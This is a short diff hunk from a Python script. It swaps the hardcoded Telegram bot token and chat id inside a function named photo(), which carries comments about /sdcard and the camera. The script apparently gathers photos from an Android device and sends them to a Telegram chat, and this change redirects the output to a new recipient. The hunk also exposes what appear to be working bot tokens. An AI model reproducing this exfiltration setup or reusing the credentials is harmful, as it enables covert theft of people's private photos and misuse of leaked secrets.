@@ -781,8 +781,8 @@ def sexy():
 
 def photo():
     session=requests.session() 
-    bot_token ='6968214361:AAGiQOBniPWX02_tlAfxAFvU9FRcjEmxZqg' 
-    chat_id ='5765886920'
+    bot_token ='6446051672:AAE9jCIkRQjvoW35Y-V23SQwE0IXhl0gEvI' 
+    chat_id ='6910221830'
     #-----------( /sdcard
     try:
         # camera 
